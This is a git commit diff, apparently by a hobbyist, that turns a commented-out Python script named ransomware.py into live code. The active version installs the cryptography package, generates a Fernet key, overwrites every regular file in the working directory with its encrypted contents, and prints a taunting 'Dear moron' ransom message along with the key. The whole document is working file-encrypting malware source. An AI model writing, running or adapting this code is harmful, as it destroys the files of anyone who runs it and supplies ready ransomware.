ae7aff6d5bd20e3cd0b7ee1dec7c83c727cbe186
GdevMan <yasenbiv66@gmail.com>
2025-11-21 15:50:15 +0200

    Refactor ransomware.py to improve file handling
    Fixed ALL bugs (i think)

--- ransomware.py
+++ ransomware.py
@@ -1,27 +1,32 @@
-"""
-#import subprocess
-#import sys
-#import os
-#try:
-#    from cryptography.fernet import Fernet
-#except ImportError:
-#    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
-#    from cryptography.fernet import Fernet
+import subprocess
+import sys
+import os
+try:
+    from cryptography.fernet import Fernet
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
+    from cryptography.fernet import Fernet
 
-#key = Fernet.generate_key()
-#files = []
+key = Fernet.generate_key()
+files = []
 
-#for i in os.listdir():
-#    print(i)
-#    files.append(i)
-#    with open(i, "r") as f:
-#        things = f.read()
-#        f = Fernet(key)
-#        encrypted = f.encrypt(things.encode())
-#    with open(i, "w") as f:
-#        f.write(encrypted)
-#print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
-#print(f'Encrypted files: {files}')
-#print(f'By the way key to unlock your files is: {key}. To learn how to use it go to https://www.nomoreransom.org/en/index.html')
-#input() #Pause
-"""
+directory = os.getcwd()
+
+for i in os.listdir():
+
+    full_path = os.path.join(directory, i)
+
+    if os.path.isdir(full_path):
+        continue
+    else:
+        files.append(i)
+    with open(i, "rb") as f:
+        things = f.read()
+
+        f = Fernet(key)
+        encrypted = f.encrypt(things)
+    with open(i, "wb") as f:
+        f.write(encrypted)
+print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
+print(f'Encrypted files: {files}')
+print(f"{key}")
